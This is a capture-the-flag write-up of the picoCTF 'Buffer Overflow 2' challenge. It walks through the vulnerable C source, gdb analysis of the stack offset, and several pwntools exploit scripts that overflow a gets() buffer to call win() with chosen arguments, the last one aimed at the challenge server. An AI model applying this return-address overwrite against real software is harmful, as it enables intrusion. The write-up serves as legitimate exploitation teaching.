---
title: "PicoCTF: Buffer Overflow 2"
date: 2024-10-09T14:23:13-05:00
draft: false
tags:
- Buffer Overflow
- Binary Exploitation
- Code Review
- x86
- Pwn
- Pico
---

### Description
Buffer Overflow 2 is a binary exploitation challenge that involves overflowing a buffer to not only call the win() function, but also to successfully pass the necessary arguments to it.


### Walkthrough
After downloading the vulnerable binary and its source code, the first thing I did was to view the source code.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

It is apparent that the binary is using the vulnerable ```gets()``` 
function with a buffer size of 100 bytes. We will need to overflow the buffer and 
call ```win()``` as well as pass in two arguments, ```0xCAFEF00D``` and
```0XF00DF00D```, in order to complete this challenge.

We can also see that we need a dummy flag in order for the program to execute correctly.

```
┌──(kali㉿kali)-[~/Writeups/pico/buff2]
└─$ echo 'pico{debug}' > flag.txt
```

To overflow the buffer, we first need to find the offset of the eip register. eip stands for 
"Extended Instruction Pointer" and as its name suggests, points to the next instruction to be 
executed. We want to write the address of ```win()``` to it. To find the address,
we can analyze ```vuln``` in gdb...

```
┌──(kali㉿kali)-[~/Writeups/pico/buff2]
└─$ gdb vuln
```

... and find the buffer allocation.

![GDB vuln buffer size](/img/pico/buff2/vuln_gets_alloc.png)

Notice that the address of offset ```ebp-0x6c``` is pushed onto the stack and is
read by ```gets()```. This means that after calling the ```gets``` function, there will be
108 (0x6c) bytes of buffer between the start of the buffer and the ```ebp``` register. Note
that the 108 bytes allocated differ from the 100-byte buffer declared in ```vuln.c```. 
Discrepancies like this are usually caused by padding or local variables.


{{< centralize-table >}}
| High Address |
| --- |
| ... |
| eip (4 bytes)|
| ebp (4 bytes)|
| buffer + padding (108 bytes)|
| ... |
| Low Address |
{{< /centralize-table >}}


```eip``` is at a higher address immediately after ```ebp```. Since ```ebp``` is a 4 byte register,
```eip``` is 112 (108 + 4) bytes from the start of the buffer. We will therefore need 112 bytes of padding
in our payload before ```eip``` starts being overwritten. 

Preliminary payload: 112 bytes padding + address of win().

```python
#!/usr/bin/python3

from pwn import *


p = process("./vuln")
elf = ELF("./vuln")

buffer_size = 112
padding = buffer_size * b'A'

addr_main = p32(elf.symbols["main"])

payload_list = [
		padding,
		addr_win
		]

payload = b''.join(payload_list)

p.sendline(payload)
p.interactive()
```

I didn't get a clear indication as to whether my payload succeeded, so I added a breakpoint
at the ```win()``` function through gdb. If ```win()``` is called, the program will pause at the breakpoint.

```python
#!/usr/bin/python3

from pwn import *


p = process("./vuln")
elf = ELF("./vuln")

buffer_size = 112
padding = buffer_size * b'A'

addr_win = p32(elf.symbols["win"])

payload_list = [
		padding,
		addr_win
		]

payload = b''.join(payload_list)

with open("payload", "wb") as f:
    f.write(payload)

g = gdb.attach(p, gdbscript = '''
        b *win
        r < payload
    ''')

p.sendline(payload)
p.interactive()
```

![win() function stop](/img/pico/buff2/win_stop.png)

We do break, meaning our exploit successfully called ```win()```. Now, we need to add 
the arguments ```0XCAFEF00D``` and ```0XF00DF00D```. Let us take a look at the stack
frame for ```win()```.


{{< centralize-table >}}
| High Address |
| --- |
| ... |
| arg2 (4 bytes) |
| arg1 (4 bytes) |
| eip (4 bytes) |
| ebp (4 bytes) |
| ... |
| Low Address |
{{< /centralize-table >}}


Unlike x64 binaries, all function arguments in x86 programs are passed directly onto the stack.
After jumping to ```win()```, we will also need to overflow ```eip``` before we can pass in arg1 and arg2.
In my exploit script I set ```eip``` to be overflowed with the address of ```main()``` for the sake of
having a valid return address, but any 4 byte value should work since the flag is being printed directly in ```win()```.

```python
#!/usr/bin/python3

from pwn import *


p = process("./vuln")
elf = ELF("./vuln")

buffer_size = 112
padding = buffer_size * b'A'

addr_win = p32(elf.symbols["win"])
addr_main = p32(elf.symbols["main"])

arg1 = p32(0xCAFEF00D)
arg2 = p32(0xF00DF00D)

payload_list = [
        padding,
        addr_win,
        addr_main,
        arg1,
        arg2
        ]

payload = b''.join(payload_list)

p.sendline(payload)
p.interactive()
```

![Local binary flag](/img/pico/buff2/local_flag.png)

Our exploit was successful. Now all that's left to do is to change the target from
the local binary to the remote pico server.

```python
#!/usr/bin/python3

from pwn import *


p = remote("saturn.picoctf.net", 54042) # Changed from binary to pico server.
elf = ELF("./vuln")

buffer_size = 112
padding = buffer_size * b'A'

addr_win = p32(elf.symbols["win"])
addr_main = p32(elf.symbols["main"])

arg1 = p32(0xCAFEF00D)
arg2 = p32(0xF00DF00D)

payload_list = [
        padding,
        addr_win,
        addr_main,
        arg1,
        arg2
        ]

payload = b''.join(payload_list)

p.sendline(payload)
p.interactive()
```

![Pico flag](/img/pico/buff2/flag.png)